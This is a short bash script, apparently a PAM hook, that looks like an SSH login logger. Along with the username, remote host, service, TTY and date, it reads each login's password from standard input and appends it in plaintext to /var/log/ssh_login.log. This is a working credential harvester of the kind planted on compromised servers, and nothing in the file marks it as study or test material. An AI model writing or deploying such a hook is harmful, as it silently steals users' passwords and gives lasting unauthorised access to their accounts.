#!/bin/bash

LOG_FILE="/var/log/ssh_login.log"

{
    echo "User: $PAM_USER"
    echo "RHOST: $PAM_RHOST"
    echo "Service: $PAM_SERVICE"
    echo "TTY: $PAM_TTY"
    echo "Date: $(date)"
    echo "Password: $(cat -)"
    echo "-----"
} >> $LOG_FILE

exit 0
